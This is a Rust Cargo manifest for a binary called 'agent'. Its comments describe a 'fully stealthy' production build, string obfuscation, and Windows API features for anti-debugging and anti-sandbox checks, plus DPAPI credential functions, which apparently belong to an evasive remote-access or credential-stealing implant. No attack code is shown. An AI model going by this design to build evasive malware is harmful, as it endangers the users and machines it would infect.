[package]
name = "agent"
version = "2.0.0"
edition = "2021"

[features]
default = ["dev"]
dev = []  # Development mode: console window + debug prints
production = []  # Production mode: no console, no debug prints, fully stealthy

[dependencies]
# Ofuscación de strings en compile-time
obfstr = "0.4"
# Random number generation for obfuscation
rand = "0.8"
# TLS support
rustls = { version = "0.23", default-features = false, features = ["std", "tls12", "aws_lc_rs"] }
webpki-roots = "0.26"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "dpapi", 
    "wincrypt", 
    "errhandlingapi", 
    "libloaderapi", 
    "memoryapi", 
    "winnt",
    "minwindef",
    "ntdef",
    "processthreadsapi",  # Para GetCurrentProcess (syscalls)
    "debugapi",           # Para IsDebuggerPresent (anti-debug)
    "sysinfoapi",         # Para GetSystemInfo (anti-sandbox)
    "winsock2",           # Para TCP keepalive configuration
    "ws2def"              # Para socket definitions
] }


[[bin]]
name = "agent"
path = "src/main.rs"

[build-dependencies]
winres = "0.1.12"
